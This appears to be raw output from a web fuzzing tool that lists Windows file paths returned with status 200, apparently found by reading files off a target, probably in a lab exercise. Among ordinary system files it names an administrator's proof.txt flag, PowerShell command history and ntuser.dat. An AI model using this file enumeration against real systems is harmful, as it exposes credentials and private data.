000002509:   200        1 L      12 W       338 Ch      "Program Files/WindowsApps/microsoft.wallet_2.4.18324.0_neutral_~_8wekyb3d8bbwe/AppxBlockMap.xml"      
000002497:   200        133 L    510 W      14368 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.4_2.42007.9001.0_x86__8wekyb3d8bbwe/AppxManifest.xml"   
000002496:   200        1 L      371 W      13258 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.4_2.42007.9001.0_x86__8wekyb3d8bbwe/AppxBlockMap.xml"   
000002495:   200        133 L    510 W      14368 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.4_2.42007.9001.0_x64__8wekyb3d8bbwe/AppxManifest.xml"   
000002492:   200        1 L      341 W      12160 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.3_2.32002.13001.0_x86__8wekyb3d8bbwe/AppxBlockMap.xml"  
000002494:   200        1 L      389 W      13914 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.4_2.42007.9001.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"   
000002491:   200        132 L    506 W      14257 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.3_2.32002.13001.0_x64__8wekyb3d8bbwe/AppxManifest.xml"  
000002488:   200        1 L      279 W      9902 Ch     "Program Files/WindowsApps/microsoft.ui.xaml.2.1_2.11906.6001.0_x86__8wekyb3d8bbwe/AppxBlockMap.xml"   
000002490:   200        1 L      351 W      12524 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.3_2.32002.13001.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"  
000002511:   200        1 L      239 W      8160 Ch     "Program Files/WindowsApps/microsoft.wallet_2.4.18324.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"           
000002512:   200        106 L    342 W      7464 Ch     "Program Files/WindowsApps/microsoft.wallet_2.4.18324.0_x64__8wekyb3d8bbwe/AppxManifest.xml"           
000002596:   200        1 L      12 W       340 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_neutral_~_8wekyb3d8bbwe/AppxBlockMap.xml"  
000002608:   200        6 L      19 W       251 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBPaging.xml"  
000002600:   200        7 L      18 W       381 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/BuildInfo.xml"          
000002612:   200        15 L     60 W       744 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBUser.xml"    
000002611:   200        3 L      12 W       171 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBProfilePictur
                                                        eData.xml"                                                                                             
000002610:   200        6 L      23 W       278 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBProfilePictur
                                                        e.xml"                                                                                                 
000002607:   200        4 L      14 W       165 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBPageCategory.
                                                        xml"                                                                                                   
000002609:   200        5 L      15 W       190 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBPermission.xm
                                                        l"                                                                                                     
000002606:   200        10 L     35 W       407 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBPage.xml"    
000002605:   200        4 L      11 W       131 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBObject.xml"  
000002604:   200        11 L     35 W       408 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBGroup.xml"   
000002603:   200        6 L      14 W       170 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBCursors.xml" 
000002602:   200        10 L     39 W       467 Ch      "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/winsdkfb/FBAppRequest.xm
                                                        l"                                                                                                     
000002599:   200        103 L    287 W      7485 Ch     "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/AppxManifest.xml"       
000002601:   200        51 L     436 W      2949 Ch     "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/ThirdPartyNotice.txt"   
000002598:   200        1 L      502 W      17191 Ch    "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"       
000002597:   200        531 L    1276 W     26094 Ch    "Program Files/WindowsApps/microsoft.xbox.tcui_1.24.10001.0_neutral_~_8wekyb3d8bbwe/AppxMetadata/AppxBu
                                                        ndleManifest.xml"                                                                                      
000002628:   200        79 L     233 W      5088 Ch     "Program Files/WindowsApps/microsoft.xboxgameoverlay_1.54.4001.0_x64__8wekyb3d8bbwe/AppxManifest.xml"  
000002627:   200        1 L      170 W      5713 Ch     "Program Files/WindowsApps/microsoft.xboxgameoverlay_1.54.4001.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"  
000002626:   200        1 L      26 W       835 Ch      "Program Files/WindowsApps/microsoft.xboxgameoverlay_1.54.4001.0_neutral_split.scale-100_8wekyb3d8bbwe/
                                                        AppxManifest.xml"                                                                                      
000002623:   200        1 L      12 W       338 Ch      "Program Files/WindowsApps/microsoft.xboxgameoverlay_1.54.4001.0_neutral_~_8wekyb3d8bbwe/AppxBlockMap.x
                                                        ml"                                                                                                    
000002624:   200        49 L     120 W      2502 Ch     "Program Files/WindowsApps/microsoft.xboxgameoverlay_1.54.4001.0_neutral_~_8wekyb3d8bbwe/AppxMetadata/A
                                                        ppxBundleManifest.xml"                                                                                 
000002625:   200        1 L      45 W       1477 Ch     "Program Files/WindowsApps/microsoft.xboxgameoverlay_1.54.4001.0_neutral_split.scale-100_8wekyb3d8bbwe/
                                                        AppxBlockMap.xml"                                                                                      
000002641:   200        1 L      12 W       338 Ch      "Program Files/WindowsApps/microsoft.xboxspeechtotextoverlay_1.21.13002.0_neutral_~_8wekyb3d8bbwe/AppxB
                                                        lockMap.xml"                                                                                           
000002646:   200        49 L     153 W      3414 Ch     "Program Files/WindowsApps/microsoft.xboxspeechtotextoverlay_1.21.13002.0_x64__8wekyb3d8bbwe/AppxManife
                                                        st.xml"                                                                                                
000002645:   200        1 L      80 W       2642 Ch     "Program Files/WindowsApps/microsoft.xboxspeechtotextoverlay_1.21.13002.0_x64__8wekyb3d8bbwe/AppxBlockM
                                                        ap.xml"                                                                                                
000002644:   200        1 L      23 W       843 Ch      "Program Files/WindowsApps/microsoft.xboxspeechtotextoverlay_1.21.13002.0_neutral_split.scale-100_8weky
                                                        b3d8bbwe/AppxManifest.xml"                                                                             
000002643:   200        1 L      45 W       1477 Ch     "Program Files/WindowsApps/microsoft.xboxspeechtotextoverlay_1.21.13002.0_neutral_split.scale-100_8weky
                                                        b3d8bbwe/AppxBlockMap.xml"                                                                             
000002642:   200        34 L     86 W       1642 Ch     "Program Files/WindowsApps/microsoft.xboxspeechtotextoverlay_1.21.13002.0_neutral_~_8wekyb3d8bbwe/AppxM
                                                        etadata/AppxBundleManifest.xml"                                                                        
000002676:   200        21 L     82 W       759 Ch      "Program Files/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Diagnostics/Co
                                                        mprehensive/Comprehensive.Tests.ps1"                                                                   
000002678:   200        103 L    390 W      5046 Ch     "Program Files/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Microsoft
                                                        .PowerShell.Operation.Validation.Tests.ps1"                                                            
000002682:   200        7 L      29 W       241 Ch      "Program Files/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Modules/E
                                                        xample3.Diagnostics/2.0.1/Diagnostics/Simple/Example3B.Diagnostics.Tests.ps1"                          
000002690:   200        40 L     156 W      1156 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_TestDrive.help.txt"                  
000002695:   200        76 L     417 W      3455 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Be.Tests.ps1"               
000002694:   200        115 L    412 W      4129 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Be.ps1"                     
000002693:   200        36 L     88 W       822 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Examples/Validator/Validator.Tests.ps1"          
000002692:   200        26 L     86 W       606 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Examples/Calculator/Add-Numbers.Tests.ps1"       
000002689:   200        148 L    837 W      5945 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_should.help.txt"                     
000002691:   200        3 L      9 W        55 Ch       "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Examples/Calculator/Add-Numbers.ps1"             
000002688:   200        141 L    685 W      5056 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_Pester.help.txt"                     
000002696:   200        14 L     36 W       374 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeGreaterThan.ps1"          
000002679:   200        7 L      29 W       241 Ch      "Program Files/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Modules/E
                                                        xample1.Diagnostics/Diagnostics/Simple/Example1.Diagnostics.Tests.ps1"                                 
000002677:   200        9 L      40 W       384 Ch      "Program Files/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Diagnostics/Si
                                                        mple/Simple.Tests.ps1"                                                                                 
000002683:   200        487 L    575 W      16479 Ch    "Program Files/WindowsPowerShell/Modules/PackageManagement/1.0.0.1/PackageManagement.format.ps1xml"    
000002680:   200        7 L      29 W       241 Ch      "Program Files/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Modules/E
                                                        xample2.Diagnostics/1.0.1/Diagnostics/Simple/Example2.Diagnostics.Tests.ps1"                           
000002681:   200        7 L      29 W       241 Ch      "Program Files/WindowsPowerShell/Modules/Microsoft.PowerShell.Operation.Validation/1.0.1/Test/Modules/E
                                                        xample3.Diagnostics/1.1.1/Diagnostics/Simple/Example3A.Diagnostics.Tests.ps1"                          
000002685:   200        157 L    404 W      5076 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/chocolateyInstall.ps1"                           
000002684:   200        53 L     155 W      1536 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/build.psake.ps1"                                 
000002687:   200        188 L    883 W      6396 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_Mocking.help.txt"                    
000002686:   200        73 L     443 W      3110 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/en-US/about_BeforeEach_AfterEach.help.txt"       
000002698:   200        14 L     36 W       365 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLessThan.ps1"             
000002702:   200        13 L     40 W       413 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLikeExactly.ps1"          
000002710:   200        12 L     43 W       490 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/ContainExactly.ps1"         
000002716:   200        13 L     38 W       425 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/MatchExactly.ps1"           
000002715:   200        21 L     74 W       587 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Match.Tests.ps1"            
000002714:   200        13 L     36 W       387 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Match.ps1"                  
000002713:   200        36 L     106 W      999 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Exist.Tests.ps1"            
000002712:   200        12 L     30 W       289 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Exist.ps1"                  
000002709:   200        25 L     101 W      998 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Contain.Tests.ps1"          
000002711:   200        20 L     85 W       859 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/ContainExactly.Tests.ps1"   
000002708:   200        13 L     41 W       454 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Contain.ps1"                
000002707:   200        20 L     72 W       691 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeOfType.Tests.ps1"         
000002706:   200        30 L     162 W      1395 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeOfType.ps1"               
000002705:   200        17 L     46 W       474 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeNullOrEmpty.Tests.ps1"    
000002704:   200        23 L     61 W       579 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeNullOrEmpty.ps1"          
000002701:   200        17 L     63 W       489 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLike.Tests.ps1"           
000002703:   200        17 L     63 W       508 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLikeExactly.Tests.ps1"    
000002700:   200        13 L     38 W       389 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLike.ps1"                 
000002697:   200        18 L     53 W       511 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeGreaterThan.Tests.ps1"    
000002699:   200        17 L     53 W       494 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/BeLessThan.Tests.ps1"       
000002717:   200        17 L     60 W       503 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/MatchExactly.Tests.ps1"     
000002719:   200        97 L     520 W      4928 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/PesterThrow.Tests.ps1"      
000002723:   200        13 L     33 W       281 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Test-Assertion.ps1"         
000002731:   200        30 L     96 W       761 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/GlobalMock-A.Tests.ps1"                
000002735:   200        132 L    412 W      3905 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/InModuleScope.ps1"                     
000002734:   200        18 L     59 W       554 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/In.Tests.ps1"                          
000002733:   200        35 L     115 W      821 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/In.ps1"                                
000002730:   200        19 L     90 W       761 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Describe.Tests.ps1"                    
000002732:   200        23 L     88 W       732 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/GlobalMock-B.Tests.ps1"                
000002729:   200        127 L    462 W      4089 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Describe.ps1"                          
000002728:   200        305 L    1042 W     11436 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Coverage.Tests.ps1"                    
000002727:   200        576 L    1524 W     17753 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Coverage.ps1"                          
000002726:   200        19 L     90 W       758 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Context.Tests.ps1"                     
000002725:   200        85 L     270 W      2337 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Context.ps1"                           
000002722:   200        162 L    594 W      5407 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Should.Tests.ps1"           
000002724:   200        14 L     77 W       457 Ch      "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/BreakAndContinue.Tests.ps1"            
000002721:   200        96 L     280 W      3239 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Should.ps1"                 
000002718:   200        53 L     237 W      2291 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/PesterThrow.ps1"            
000002720:   200        22 L     94 W       1013 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Assertions/Set-TestInconclusive.ps1"   
000002736:   200        44 L     211 W      1608 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/InModuleScope.Tests.ps1"               
000002738:   200        242 L    1104 W     9754 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/It.Tests.ps1"                          
000002742:   200        88 L     334 W      3202 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/New-Fixture.Tests.ps1"                 
000002750:   200        575 L    1995 W     27623 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestResults.Tests.ps1"                 
000002754:   200        219 L    227 W      8551 Ch     "Program Files/WindowsPowerShell/Modules/PSReadline/2.0.0/PSReadLine.format.ps1xml"                    
000002753:   200        190 L    193 W      8251 Ch     "Program Files/WindowsPowerShell/Modules/PowerShellGet/1.0.0.1/PSGet.Format.ps1xml"                    
000002752:   200        285 L    1085 W     11155 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Pester.Tests.ps1"                                
000002749:   200        462 L    1128 W     16435 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestResults.ps1"                       
000002751:   200        177 L    798 W      6698 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestsRunningInCleanRunspace.Tests.ps1" 
000002748:   200        163 L    525 W      4180 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestDrive.Tests.ps1"                   
000002747:   200        117 L    385 W      3850 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/TestDrive.ps1"                         
000002746:   200        186 L    629 W      5571 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/SetupTeardown.Tests.ps1"               
000002745:   200        471 L    1319 W     14093 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/SetupTeardown.ps1"                     
000002744:   200        405 L    1375 W     14444 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/PesterState.Tests.ps1"                 
000002741:   200        107 L    388 W      3311 Ch     "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/New-Fixture.ps1"                       
000002740:   200        1673 L   6284 W     59679 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Mock.Tests.ps1"                        
000002737:   200        402 L    1240 W     11944 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/It.ps1"                                
000002743:   200        543 L    1359 W     19397 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/PesterState.ps1"                       
000002739:   200        1411 L   4700 W     48974 Ch    "Program Files/WindowsPowerShell/Modules/Pester/3.4.0/Functions/Mock.ps1"                              
000002759:   200        142 L    454 W      4968 Ch     "ProgramData/Microsoft/AppV/Setup/OfficeIntegrator.ps1"                                                
000002770:   200        4 L      90 W       12703 Ch    "ProgramData/Microsoft/IdentityCRL/production/wlidsvcconfig.xml"                                       
000002774:   200        13 L     71 W       65536 Ch    "ProgramData/Microsoft/SmsRouter/MessageStore/edb.log"                                                 
000002776:   200        238 L    2062 W     65526 Ch    "ProgramData/Microsoft/SmsRouter/MessageStore/edbtmp.log"                                              
000002763:   200        17 L     101 W      1334 Ch     "ProgramData/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/resource.xml"          
000002777:   200        391 L    663 W      18176 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/DesktopSettings2013.xml"                                     
000002769:   200        4 L      90 W       12975 Ch    "ProgramData/Microsoft/IdentityCRL/INT/wlidsvcconfig.xml"                                              
000002767:   200        0 L      1 W        10 Ch       "ProgramData/Microsoft/Diagnosis/osver.txt"                                                            
000002766:   200        192 L    392 W      11364 Ch    "ProgramData/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/tasks.xml"             
000002764:   200        225 L    351 W      11005 Ch    "ProgramData/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/tasks.xml"             
000002758:   200        2 L      2 W        25 Ch       "ProgramData/Microsoft OneDrive/setup/refcount.ini"                                                    
000002760:   200        22 L     64 W       1741 Ch     "ProgramData/Microsoft/Device Stage/Device/{8702d817-5aad-4674-9ef3-4d3decd87120}/behavior.xml"        
000002778:   200        133 L    253 W      5794 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/EaseOfAccessSettings2013.xml"                                
000002780:   200        75 L     153 W      2537 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013Backup.xml"                     
000002784:   200        26 L     70 W       955 Ch      "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftNotepad.xml"                                        
000002792:   200        1864 L   2602 W     68365 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win64.xml"                                
000002799:   200        32 L     89 W       1289 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin32.xml"                             
000002798:   200        32 L     89 W       1286 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin64.xml"                             
000002765:   200        24 L     141 W      1512 Ch     "ProgramData/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/en-US/resource.xml"    
000002762:   200        17 L     101 W      1334 Ch     "ProgramData/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/en-US/resource.xml"    
000002797:   200        32 L     89 W       1286 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin32.xml"                             
000002795:   200        1788 L   2504 W     65729 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win32.xml"                                
000002794:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin64.xml"                          
000002796:   200        1788 L   2504 W     65732 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win64.xml"                                
000002761:   200        29 L     96 W       2913 Ch     "ProgramData/Microsoft/Device Stage/Device/{113527a4-45d4-4b6f-b567-97838f1b04b0}/behavior.xml"        
000002768:   200        1364 L   8164 W     510846 Ch   "ProgramData/Microsoft/EdgeUpdate/Log/MicrosoftEdgeUpdate.log"                                         
000002787:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin32.xml"                          
000002788:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin64.xml"                          
000002790:   200        337 L    568 W      10594 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win64.xml"                       
000002789:   200        337 L    568 W      10594 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win32.xml"                       
000002783:   200        74 L     129 W      2863 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win64.xml"                                  
000002779:   200        98 L     193 W      3109 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013.xml"                           
000002793:   200        400 L    604 W      13158 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin32.xml"                          
000002781:   200        109 L    169 W      3966 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftLync2010.xml"                                       
000002785:   200        1996 L   2711 W     72783 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win32.xml"                                
000002782:   200        74 L     129 W      2863 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win32.xml"                                  
000002800:   200        32 L     89 W       1289 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin64.xml"                             
000002802:   200        74 L     131 W      2889 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win64.xml"                      
000002806:   200        60 L     152 W      2521 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/ThemeSettings2013.xml"                                       
000002791:   200        1864 L   2602 W     68365 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win32.xml"                                
000002786:   200        1996 L   2711 W     72783 Ch    "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win64.xml"                                
000002808:   200        12 L     64 W       611 Ch      "ProgramData/Microsoft/UEV/Scripts/RegisterInboxTemplates.ps1"                                         
000002805:   200        71 L     199 W      3253 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/RoamingCredentialSettings.xml"                               
000002807:   200        26 L     33 W       890 Ch      "ProgramData/Microsoft/UEV/InboxTemplates/VdiState.xml"                                                
000002804:   200        46 L     131 W      2038 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/NetworkPrinters.xml"                                         
000002801:   200        74 L     131 W      2889 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win32.xml"                      
000002803:   200        26 L     71 W       1003 Ch     "ProgramData/Microsoft/UEV/InboxTemplates/MicrosoftWordpad.xml"                                        
000002837:   200        5 L      11 W       120 Ch      "ProgramData/Microsoft/Windows Defender/Scans/History/Service/Unknown.Log"                             
000002773:   200        0 L      1 W        1310720 C   "ProgramData/Microsoft/Network/Downloader/edbtmp.log"                                                  
                                            h                                                                                                                  
000002847:   200        364 L    921 W      16858 Ch    "ProgramData/Microsoft/Windows/Power Efficiency Diagnostics/energy-report-latest.xml"                  
000002879:   200        0 L      1 W        12 Ch       "system volume information/wpsettings.dat"                                                             
000002840:   200        958 L    10089 W    230263 Ch   "ProgramData/Microsoft/Windows/Models/SBCModel.txt"                                                    
000002901:   200        1 L      1 W        34 Ch       "users/administrator/desktop/proof.txt"                                                                
000002900:   200        4 L      9 W        282 Ch      "users/administrator/desktop/desktop.ini"                                                              
000002899:   200        9 L      58 W       982 Ch      "users/administrator/appdata/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt"  
000002772:   200        221 L    1859 W     1310602 C   "ProgramData/Microsoft/Network/Downloader/edb00001.log"                                                
                                            h                                                                                                                  
000002903:   200        2 L      10 W       20 Ch       "users/administrator/ntuser.ini"                                                                       
000002902:   200        3483 L   25908 W    1304916 C   "users/administrator/ntuser.dat"                                                                       
                                            h                                                                                                                  
000003748:   200        17 L     101 W      1334 Ch     "Users/All Users/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/resource.xml"      
000003747:   200        17 L     101 W      1334 Ch     "Users/All Users/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/en-US/resource.xml"
000003746:   200        29 L     96 W       2913 Ch     "Users/All Users/Microsoft/Device Stage/Device/{113527a4-45d4-4b6f-b567-97838f1b04b0}/behavior.xml"    
000003745:   200        22 L     64 W       1741 Ch     "Users/All Users/Microsoft/Device Stage/Device/{8702d817-5aad-4674-9ef3-4d3decd87120}/behavior.xml"    
000003744:   200        142 L    454 W      4968 Ch     "Users/All Users/Microsoft/AppV/Setup/OfficeIntegrator.ps1"                                            
000003743:   200        2 L      2 W        25 Ch       "Users/All Users/Microsoft OneDrive/setup/refcount.ini"                                                
000003749:   200        225 L    351 W      11005 Ch    "Users/All Users/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/tasks.xml"         
000003751:   200        192 L    392 W      11364 Ch    "Users/All Users/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/tasks.xml"         
000003755:   200        4 L      90 W       12703 Ch    "Users/All Users/Microsoft/IdentityCRL/production/wlidsvcconfig.xml"                                   
000003763:   200        133 L    253 W      5794 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/EaseOfAccessSettings2013.xml"                            
000003769:   200        26 L     70 W       955 Ch      "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftNotepad.xml"                                    
000003768:   200        74 L     129 W      2863 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win64.xml"                              
000003767:   200        74 L     129 W      2863 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win32.xml"                              
000003766:   200        109 L    169 W      3966 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftLync2010.xml"                                   
000003765:   200        75 L     153 W      2537 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013Backup.xml"                 
000003762:   200        391 L    663 W      18176 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/DesktopSettings2013.xml"                                 
000003764:   200        98 L     193 W      3109 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftInternetExplorer2013.xml"                       
